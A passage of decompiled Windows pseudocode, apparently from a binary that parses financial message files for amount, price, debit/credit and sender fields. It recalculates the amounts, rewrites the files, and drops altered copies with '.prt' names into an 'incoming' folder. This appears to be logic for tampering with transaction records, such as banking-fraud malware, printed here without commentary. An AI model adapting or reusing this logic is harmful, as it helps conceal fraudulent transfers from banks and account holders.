            v11 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          qmemcpy((void *)(*(_DWORD *)(v2 + 8) + *(_DWORD *)(v2 + 4)), v11, v9);
          v12 = *(_DWORD *)(v2 + 4);
          *(_DWORD *)(v2 + 8) = v10;
          *(_BYTE *)(v12 + v10) = 0;
        }
      }
LABEL_27:
      v13 = v24++;
    }
    while ( !sub_401E90(Str, (int)&v20, v13) );
  }
  v14 = strlen((const char *)&unk_41104C);
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(v2, v14, 1) )
  {
    qmemcpy(*(void **)(v2 + 4), &unk_41104C, v14);
    v15 = *(_DWORD *)(v2 + 4);
    *(_DWORD *)(v2 + 8) = v14;
    *(_BYTE *)(v15 + v14) = 0;
  }
  v6 = lpFirst;
LABEL_31:
  if ( v6 )
  {
    v16 = *(v6 - 1);
    if ( v16 && v16 != -1 )
      *((_BYTE *)v6 - 1) = v16 - 1;
    else
      sub_40BC56((void *)(v6 - 1));
  }
  return (v18 != 0) - 1;
}
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00404800) --------------------------------------------------------
signed int __cdecl sub_404800(char *FullPath, char a2, const char *a3)
{
  int v3; // esi
  int v4; // ebx
  unsigned int v5; // ebp
  signed int result; // eax
  LPSTR (__stdcall *v7)(LPCSTR, LPCSTR); // edi
  char *v8; // eax
  int v9; // ST24_4
  const CHAR *v10; // eax
  char *v11; // eax
  int v12; // ST24_4
  int v13; // esi
  char *v14; // eax
  int v15; // ST24_4
  int v16; // esi
  char *v17; // eax
  int v18; // ST24_4
  const CHAR *v19; // eax
  const char *v20; // eax
  char *v21; // edx
  __int64 v22; // rdi
  const CHAR *v23; // eax
  char *v24; // eax
  int v25; // ST24_4
  int v26; // esi
  char *v27; // eax
  int v28; // ST24_4
  int v29; // esi
  char *v30; // eax
  char *v31; // eax
  char v32; // cl
  __int64 v33; // rdi
  __int64 v34; // kr18_8
  LPCVOID v35; // eax
  char *v36; // eax
  char *v37; // eax
  char *v38; // ecx
  int v39; // eax
  char *v40; // ecx
  char v41; // al
  char v42; // al
  int v43; // eax
  int v44; // edi
  char v45; // al
  int v46; // eax
  int v47; // esi
  char v48; // al
  char v49; // al
  char v50; // al
  char v51; // al
  char v52; // al
  char v53; // [esp+13h] [ebp-401h]
  char v54; // [esp+13h] [ebp-401h]
  char v55; // [esp+14h] [ebp-400h]
  LPCVOID lpBuffer; // [esp+18h] [ebp-3FCh]
  DWORD nNumberOfBytesToWrite; // [esp+1Ch] [ebp-3F8h]
  int v58; // [esp+20h] [ebp-3F4h]
  int v59; // [esp+24h] [ebp-3F0h]
  LPCSTR lpFirst; // [esp+28h] [ebp-3ECh]
  int v61; // [esp+2Ch] [ebp-3E8h]
  int v62; // [esp+30h] [ebp-3E4h]
  unsigned __int64 v63; // [esp+34h] [ebp-3E0h]
  int v64; // [esp+3Ch] [ebp-3D8h]
  char *Source; // [esp+40h] [ebp-3D4h]
  int v66; // [esp+44h] [ebp-3D0h]
  int v67; // [esp+48h] [ebp-3CCh]
  int v68; // [esp+4Ch] [ebp-3C8h]
  int v69; // [esp+50h] [ebp-3C4h]
  char *Str; // [esp+54h] [ebp-3C0h]
  __int64 v71; // [esp+60h] [ebp-3B4h]
  __int64 v72; // [esp+68h] [ebp-3ACh]
  int v73; // [esp+70h] [ebp-3A4h]
  int v74; // [esp+74h] [ebp-3A0h]
  int v75; // [esp+80h] [ebp-394h]
  char *Src; // [esp+84h] [ebp-390h]
  int v77; // [esp+90h] [ebp-384h]
  LPCSTR v78; // [esp+94h] [ebp-380h]
  int v79; // [esp+A0h] [ebp-374h]
  int v80; // [esp+B0h] [ebp-364h]
  char v81; // [esp+C0h] [ebp-354h]
  char v82; // [esp+C1h] [ebp-353h]
  __int16 v83; // [esp+FDh] [ebp-317h]
  char v84; // [esp+FFh] [ebp-315h]
  char Dest; // [esp+100h] [ebp-314h]
  char v86; // [esp+101h] [ebp-313h]
  __int16 v87; // [esp+17Dh] [ebp-297h]
  char v88; // [esp+17Fh] [ebp-295h]
  char v89; // [esp+180h] [ebp-294h]
  char v90; // [esp+181h] [ebp-293h]
  __int16 v91; // [esp+1FDh] [ebp-217h]
  char v92; // [esp+1FFh] [ebp-215h]
  char Dir; // [esp+200h] [ebp-214h]
  char v94; // [esp+201h] [ebp-213h]
  __int16 v95; // [esp+301h] [ebp-113h]
  char v96; // [esp+303h] [ebp-111h]
  char Filename; // [esp+304h] [ebp-110h]
  char v98; // [esp+305h] [ebp-10Fh]
  __int16 v99; // [esp+405h] [ebp-Fh]
  char v100; // [esp+407h] [ebp-Dh]
  int v101; // [esp+410h] [ebp-4h]

  v3 = 0;
  LOBYTE(v69) = v53;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v69, 0);
  v55 = v53;
  v101 = 0;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v55, 0);
  LOBYTE(v101) = 1;
  v4 = 0;
  v5 = 0;
  v71 = 0i64;
  v63 = 0i64;
  if ( sub_401E40(FullPath, (int)&v69) )
    goto LABEL_2;
  v54 = 0;
  LOBYTE(v59) = 0;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v59, 0);
  v7 = StrStrIA;
  LOBYTE(v101) = 2;
  while ( 1 )
  {
    v8 = Str;
    if ( !Str )
      v8 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    v9 = v3++;
    if ( sub_401E90(v8, (int)&v59, v9) )
      break;
    v10 = lpFirst;
    if ( !lpFirst )
      v10 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    if ( v7(v10, a19aAmount) )
    {
      LOBYTE(v73) = v54;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v73, 0);
      LOBYTE(v80) = v54;
      LOBYTE(v101) = 3;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v80, 0);
      LOBYTE(v101) = 4;
      LOBYTE(v77) = v54;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v77, 0);
      v11 = Str;
      LOBYTE(v101) = 5;
      if ( !Str )
        v11 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v12 = v3;
      v13 = v3 + 1;
      if ( sub_401E90(v11, (int)&v73, v12) )
        goto LABEL_121;
      v14 = Str;
      if ( !Str )
        v14 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v15 = v13;
      v16 = v13 + 1;
      if ( sub_401E90(v14, (int)&v80, v15) )
        goto LABEL_121;
      v17 = Str;
      if ( !Str )
        v17 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v18 = v16;
      v3 = v16 + 1;
      v68 = v3;
      if ( sub_401E90(v17, (int)&v77, v18) )
      {
LABEL_121:
        LOBYTE(v101) = 4;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v77, 1);
        LOBYTE(v101) = 3;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v80, 1);
        LOBYTE(v101) = 2;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v73, 1);
        break;
      }
      v19 = v78;
      if ( !v78 )
        v19 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( v7(v19, aAmount_0) )
      {
        v20 = v78;
        if ( !v78 )
          v20 = (const char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v21 = strchr(v20, 35);
        if ( v21 )
        {
          Dest = 0;
          memset(&v86, 0, 0x7Cu);
          v87 = 0;
          v88 = 0;
          v81 = 35;
          memset(&v82, 0, 0x3Cu);
          v83 = 0;
          v84 = 0;
          v22 = sub_402270(v21 + 1);
          v71 = v22;
          if ( !(v5 | v4) )
          {
            if ( a2 )
              v72 = qword_4195B0;
            else
              v72 = qword_4195C0;
            v5 = (unsigned __int64)(v22 - 100 * (v22 / 10000000) - v72) >> 32;
            v4 = v22 - 100 * (unsigned __int64)(v22 / 10000000) - v72;
          }
          v63 = __PAIR__(v5, v4) + (signed __int64)__PAIR__(v5, v4) / 100000;
          if ( a2 )
          {
            qword_4195B0 = 0i64;
            dword_4195A8 = 0;
            dword_4195AC = 0;
          }
          else
          {
            qword_4195C0 = 0i64;
            dword_4195B8 = 0;
            dword_4195BC = 0;
          }
          sub_4020F0(v63, SHIDWORD(v63), &v82, 0x32u);
          strcat(&v81, asc_40F744);
          sprintf(&Dest, aAmount27s, &v81);
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(&v77, &Dest, strlen(&Dest));
          v54 = 1;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
            &v55,
            &v59,
            0,
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
            &v55,
            &v73,
            0,
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
            &v55,
            &v80,
            0,
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
            &v55,
            &v77,
            0,
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
          v7 = StrStrIA;
          v3 = v68;
        }
      }
      LOBYTE(v101) = 4;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v77, 1);
      LOBYTE(v101) = 3;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v80, 1);
      LOBYTE(v101) = 2;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v73, 1);
    }
    else
    {
      v23 = lpFirst;
      if ( !lpFirst )
        v23 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( v7(v23, a90bPrice) )
      {
        LOBYTE(v64) = v54;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v64, 0);
        LOBYTE(v79) = v54;
        LOBYTE(v101) = 6;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v79, 0);
        LOBYTE(v101) = 7;
        LOBYTE(v75) = v54;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v75, 0);
        v24 = Str;
        LOBYTE(v101) = 8;
        if ( !Str )
          v24 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v25 = v3;
        v26 = v3 + 1;
        if ( sub_401E90(v24, (int)&v64, v25) )
          goto LABEL_122;
        v27 = Str;
        if ( !Str )
          v27 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v28 = v26;
        v29 = v26 + 1;
        if ( sub_401E90(v27, (int)&v79, v28) )
          goto LABEL_122;
        v30 = Str;
        if ( !Str )
          v30 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v68 = v29 + 1;
        if ( sub_401E90(v30, (int)&v75, v29) )
        {
LABEL_122:
          LOBYTE(v101) = 7;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v75, 1);
          LOBYTE(v101) = 6;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v79, 1);
          LOBYTE(v101) = 2;
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v64, 1);
          break;
        }
        v31 = Src;
        if ( !Src )
          v31 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( *v31 == 32 )
        {
          do
            v32 = (v31++)[1];
          while ( v32 == 32 );
        }
        if ( a2 )
          v33 = qword_4195B0;
        else
          v33 = qword_4195C0;
        v34 = sub_402270(v31) - v33;
        v5 = HIDWORD(v34);
        v4 = v34;
        v89 = 0;
        memset(&v90, 0, 0x7Cu);
        v91 = 0;
        v92 = 0;
        if ( v34 < 0 )
        {
          v4 = -(signed int)v34;
          v5 = (unsigned __int64)-v34 >> 32;
        }
        snprintf(&v89, 0x7Fu, aI64d02d, (signed __int64)__PAIR__(v5, v4) / 100, (signed __int64)__PAIR__(v5, v4) % 100);
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(&v75, &v89, strlen(&v89));
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
          &v55,
          &v59,
          0,
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
          &v55,
          &v64,
          0,
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
          &v55,
          &v79,
          0,
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
          &v55,
          &v75,
          0,
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
        LOBYTE(v101) = 7;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v75, 1);
        LOBYTE(v101) = 6;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v79, 1);
        LOBYTE(v101) = 2;
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v64, 1);
        v7 = StrStrIA;
        v3 = v68;
      }
      else
      {
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(
          &v55,
          &v59,
          0,
          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
      }
    }
  }
  if ( !v54 )
    goto LABEL_123;
  v35 = lpBuffer;
  if ( !lpBuffer )
    v35 = (LPCVOID)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
  if ( sub_401320(FullPath, v35, nNumberOfBytesToWrite, 0) )
  {
LABEL_123:
    LOBYTE(v101) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v59, 1);
LABEL_2:
    LOBYTE(v101) = 0;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v55, 1);
    v101 = -1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v69, 1);
    return -1;
  }
  if ( a2 )
  {
    v46 = sub_4032F0(byte_410214);
    v47 = sub_4041C0(FullPath, v46);
    if ( lpFirst )
    {
      v48 = *(lpFirst - 1);
      if ( v48 && v48 != -1 )
        *((_BYTE *)lpFirst - 1) = v48 - 1;
      else
        sub_40BC56((void *)(lpFirst - 1));
    }
    lpFirst = 0;
    v61 = 0;
    v62 = 0;
    if ( lpBuffer )
    {
      v49 = *((char *)lpBuffer - 1);
      if ( v49 && v49 != -1 )
        *((char *)lpBuffer - 1) = v49 - 1;
      else
        sub_40BC56((char *)lpBuffer - 1);
    }
    lpBuffer = 0;
    nNumberOfBytesToWrite = 0;
    v58 = 0;
    if ( Str )
    {
      v50 = *(Str - 1);
      if ( v50 && v50 != -1 )
      {
        *(Str - 1) = v50 - 1;
        return v47;
      }
      sub_40BC56(Str - 1);
    }
    result = v47;
  }
  else
  {
    LOBYTE(v73) = v54;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v73, 0);
    LOBYTE(v101) = 9;
    LOBYTE(v64) = v54;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v64, 0);
    v36 = (char *)lpBuffer;
    LOBYTE(v101) = 10;
    if ( !lpBuffer )
      v36 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    if ( !sub_404410(v36, (int)&v73) )
    {
      v37 = (char *)lpBuffer;
      if ( !lpBuffer )
        v37 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( !sub_4045C0(v37, (int)&v64) )
      {
        v38 = Source;
        if ( !Source )
          v38 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v39 = v74;
        if ( !v74 )
          v39 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        sub_402D70(v39, v71, SHIDWORD(v71), (int)&unk_419068, v38, v63, SHIDWORD(v63));
      }
    }
    if ( Source )
    {
      v40 = Source - 1;
      v41 = *(Source - 1);
      if ( v41 && v41 != -1 )
        *v40 = v41 - 1;
      else
        sub_40BC56(v40);
    }
    Source = 0;
    v66 = 0;
    v67 = 0;
    LOBYTE(v101) = 2;
    if ( v74 )
    {
      v42 = *(_BYTE *)(v74 - 1);
      if ( v42 && v42 != -1 )
        *(_BYTE *)(v74 - 1) = v42 - 1;
      else
        sub_40BC56((void *)(v74 - 1));
    }
    Filename = 0;
    memset(&v98, 0, 0x100u);
    v99 = 0;
    v100 = 0;
    Dir = 0;
    memset(&v94, 0, 0x100u);
    v95 = 0;
    v96 = 0;
    strcpy(&Dir, Path);
    strcat(&Dir, aIncoming);
    strcat(&Dir, a3);
    v43 = rand();
    sprintf(&Filename, a001604dPrt, v43 % 1000 + 8000);
    sub_4019F0(FullPath, &Dir, &Filename, 1);
    v44 = sub_403EB0(&Dir, &Filename);
    if ( lpFirst )
    {
      v45 = *(lpFirst - 1);
      if ( v45 && v45 != -1 )
        *((_BYTE *)lpFirst - 1) = v45 - 1;
      else
        sub_40BC56((void *)(lpFirst - 1));
    }
    lpFirst = 0;
    v61 = 0;
    v62 = 0;
    if ( lpBuffer )
    {
      v51 = *((char *)lpBuffer - 1);
      if ( v51 && v51 != -1 )
        *((char *)lpBuffer - 1) = v51 - 1;
      else
        sub_40BC56((char *)lpBuffer - 1);
    }
    lpBuffer = 0;
    nNumberOfBytesToWrite = 0;
    v58 = 0;
    if ( Str )
    {
      v52 = *(Str - 1);
      if ( v52 && v52 != -1 )
        *(Str - 1) = v52 - 1;
      else
        sub_40BC56(Str - 1);
    }
    result = v44;
  }
  return result;
}
// 40D108: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD);
// 40D10C: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::append(_DWORD, _DWORD, _DWORD, _DWORD);
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 4195A8: using guessed type int dword_4195A8;
// 4195AC: using guessed type int dword_4195AC;
// 4195B0: using guessed type __int64 qword_4195B0;
// 4195B8: using guessed type int dword_4195B8;
// 4195BC: using guessed type int dword_4195BC;
// 4195C0: using guessed type __int64 qword_4195C0;

//----- (004053C0) --------------------------------------------------------
int __cdecl sub_4053C0(char a1)
{
  const char *v1; // ebx
  HANDLE v2; // edi
  char *v4; // esi
  char Path; // [esp+8h] [ebp-244h]
  char v6; // [esp+9h] [ebp-243h]
  __int16 v7; // [esp+109h] [ebp-143h]
  char v8; // [esp+10Bh] [ebp-141h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+10Ch] [ebp-140h]

  Path = 0;
  memset(&v6, 0, 0x100u);
  v7 = 0;
  v8 = 0;
  v1 = byte_41082C;
  if ( !a1 )
    v1 = byte_410930;
  makepath(&Path, 0, v1, Ext, Ext);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v2 = FindFirstFileA(&Path, &FindFileData);
  if ( v2 == (HANDLE)-1 )
    return 0;
  while ( 1 )
  {
    if ( !(FindFileData.dwFileAttributes & 0x10) )
    {
      v4 = strchr(FindFileData.cFileName, 45);
      if ( v4 )
        break;
    }
    if ( !FindNextFileA(v2, &FindFileData) )
    {
      FindClose(v2);
      return 0;
    }
  }
  makepath(&Path, 0, v1, FindFileData.cFileName, 0);
  sub_404800(&Path, a1, v4 + 1);
  sub_401640(&Path);
  FindClose(v2);
  return 0;
}

//----- (004054F0) --------------------------------------------------------
int __cdecl sub_4054F0(char *a1, int a2, int a3, int a4, int a5)
{
  signed int v5; // ebp
  signed int v6; // esi
  char *v7; // edi
  signed int v8; // ebx
  const CHAR *v9; // eax
  bool v10; // zf
  const CHAR *v11; // eax
  int v12; // eax
  LPCSTR v13; // edx
  CHAR v14; // al
  const CHAR *v15; // eax
  const char *v16; // eax
  char *v17; // eax
  unsigned __int64 v18; // kr08_8
  const char *v19; // edx
  int v20; // ST0C_4
  char v21; // cl
  int result; // eax
  int v23; // eax
  int v24; // ST0C_4
  int v25; // ebx
  int v26; // ebp
  unsigned int v27; // edx
  int v28; // eax
  const CHAR *v29; // esi
  _BYTE *v30; // ecx
  const CHAR *v31; // eax
  const CHAR *v32; // eax
  int v33; // esi
  _DWORD *v34; // eax
  int v35; // esi
  _DWORD *v36; // eax
  unsigned int v37; // edi
  int v38; // ebp
  const void *v39; // esi
  int v40; // ST0C_4
  const CHAR *v41; // eax
  char v42; // cl
  char v43; // al
  char v44; // al
  char v45; // [esp+12h] [ebp-52h]
  int v46; // [esp+14h] [ebp-50h]
  int v47; // [esp+14h] [ebp-50h]
  char Str[4]; // [esp+18h] [ebp-4Ch]
  int v49; // [esp+28h] [ebp-3Ch]
  _BYTE *v50; // [esp+2Ch] [ebp-38h]
  unsigned int v51; // [esp+30h] [ebp-34h]
  int v52; // [esp+34h] [ebp-30h]
  char v53; // [esp+38h] [ebp-2Ch]
  LPCSTR v54; // [esp+3Ch] [ebp-28h]
  int v55; // [esp+40h] [ebp-24h]
  int v56; // [esp+48h] [ebp-1Ch]
  LPCSTR lpFirst; // [esp+4Ch] [ebp-18h]
  int v58; // [esp+60h] [ebp-4h]

  strcpy(Str, "     Value  ");
  v5 = 0;
  LOBYTE(v56) = (_BYTE)a1;
  v45 = 0;
  v6 = 0;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v56, 0);
  v7 = a1;
  v8 = 1;
  v58 = 0;
  if ( sub_401E90(a1, (int)&v56, 0) )
    goto LABEL_35;
  while ( 1 )
  {
    v9 = lpFirst;
    if ( !lpFirst )
      v9 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    v10 = StrStrIA(v9, aDebitCredit) == 0;
    v11 = lpFirst;
    if ( v10 )
    {
      if ( !lpFirst )
        v11 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v11, aSender_0) && a4 )
      {
        v12 = v8++;
        if ( sub_401E90(v7, (int)&v56, v12) )
          goto LABEL_35;
        v13 = lpFirst;
        if ( !lpFirst )
          v13 = (LPCSTR)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( *v13 == 32 )
        {
          do
            v14 = (v13++)[1];
          while ( v14 == 32 );
        }
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(a4, v13, strlen(v13));
      }
      else
      {
        v15 = lpFirst;
        if ( !lpFirst )
          v15 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v15, aAmount) )
        {
          v16 = lpFirst;
          if ( !lpFirst )
            v16 = (const char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          v17 = strchr(v16, 35);
          if ( v17 )
          {
            v18 = sub_402270(v17 + 1) * __PAIR__(v5, v6);
            v5 = HIDWORD(v18);
            v6 = v18;
            v45 = 1;
          }
        }
      }
    }
    else
    {
      if ( !lpFirst )
        v11 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( StrStrIA(v11, aDebit) )
      {
        v6 = -1;
        v5 = -1;
      }
      else
      {
        v6 = 1;
        v5 = 0;
      }
    }
    v19 = lpFirst;
    if ( !lpFirst )
      v19 = (const char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    if ( !strnicmp(v19, Str, strlen(Str)) )
      break;
    v7 = a1;
    v20 = v8++;
    if ( sub_401E90(a1, (int)&v56, v20) )
    {
      v21 = 0;
      v46 = v8;
      goto LABEL_34;
    }
  }
  v46 = v8;
  v21 = 1;
LABEL_34:
  if ( v45 )
  {
    v23 = a5;
    if ( a5 )
    {
      *(_DWORD *)a5 = v6;
      *(_DWORD *)(v23 + 4) = v5;
    }
    if ( v21 )
    {
      v53 = (char)a1;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v53, 0);
      LOBYTE(v49) = (_BYTE)a1;
      LOBYTE(v58) = 1;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v49, 0);
      v24 = v46;
      LOBYTE(v58) = 2;
      v47 = v46 + 1;
      if ( !sub_401E90(a1, (int)&v49, v24) )
      {
        v25 = a3;
        v26 = a2;
        do
        {
          v27 = v51;
          if ( v51 < 0xA )
            break;
          v28 = (int)v50;
          if ( v51 >= 3 && v50 )
          {
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(&v49);
            v28 = (int)v50;
            v27 = v51;
            v29 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
            v30 = v50 + 3;
          }
          else
          {
            v29 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
            v30 = (_BYTE *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          }
          if ( *v30 == 58 )
          {
            if ( !v55 )
              goto LABEL_78;
            v41 = v54;
            if ( !v54 )
              v41 = v29;
            if ( sub_4020A0(v41, (int)&unk_411060) >= 0 )
              sub_40A150((_DWORD *)v25, &a1, *(_DWORD **)(v25 + 4), &v53);
            else
              sub_40A150((_DWORD *)v26, &a1, *(_DWORD **)(v26 + 4), &v53);
            break;
          }
          if ( v27 >= 5 && v28 )
          {
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(&v49);
            v27 = v51;
            v29 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
            v31 = v50 + 5;
          }
          else
          {
            v31 = v29;
          }
          if ( *v31 == 32 )
          {
            v37 = std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos;
            if ( v27 < std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos )
              v37 = v27;
            if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos - v55 <= v37 )
              std::_Xlen();
            if ( v37 )
            {
              v38 = v55 + v37;
              if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                                      &v53,
                                      v55 + v37,
                                      0) )
              {
                v39 = v50;
                if ( !v50 )
                  v39 = (const void *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
                qmemcpy((void *)&v54[v55], v39, v37);
                std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(&v53, v37, v38);
              }
              v26 = a2;
            }
          }
          else
          {
            if ( v55 )
            {
              v32 = v54;
              if ( !v54 )
                v32 = v29;
              if ( sub_4020A0(v32, (int)&unk_411060) >= 0 )
              {
                v35 = *(_DWORD *)(v25 + 4);
                v36 = sub_40A2B0(*(_DWORD **)(v25 + 4), *(_DWORD *)(v35 + 4));
                *(_DWORD *)(v35 + 4) = v36;
                *(_DWORD *)v36[1] = v36;
                sub_40A2E0((int)(v36 + 2), &v53);
                ++*(_DWORD *)(v25 + 8);
              }
              else
              {
                v33 = *(_DWORD *)(v26 + 4);
                v34 = sub_40A2B0(*(_DWORD **)(v26 + 4), *(_DWORD *)(v33 + 4));
                *(_DWORD *)(v33 + 4) = v34;
                *(_DWORD *)v34[1] = v34;
                sub_40A2E0((int)(v34 + 2), &v53);
                ++*(_DWORD *)(v26 + 8);
              }
            }
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
              &v53,
              &v49,
              0,
              std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
          }
          v40 = v47++;
        }
        while ( !sub_401E90(a1, (int)&v49, v40) );
      }
      v28 = (int)v50;
LABEL_78:
      if ( v28 )
      {
        v42 = *(_BYTE *)(v28 - 1);
        if ( v42 && v42 != -1 )
          *(_BYTE *)(v28 - 1) = v42 - 1;
        else
          sub_40BC56((void *)(v28 - 1));
      }
      v50 = 0;
      v51 = 0;
      v52 = 0;
      if ( v54 )
      {
        v43 = *(v54 - 1);
        if ( v43 && v43 != -1 )
          *((_BYTE *)v54 - 1) = v43 - 1;
        else
          sub_40BC56((void *)(v54 - 1));
      }
    }
    if ( lpFirst )
    {
      v44 = *(lpFirst - 1);
      if ( v44 && v44 != -1 )
        *((_BYTE *)lpFirst - 1) = v44 - 1;
      else
        sub_40BC56((void *)(lpFirst - 1));
    }
    result = 0;
  }
  else
  {
LABEL_35:
    v58 = -1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v56, 1);
    result = -1;
  }
  return result;
}
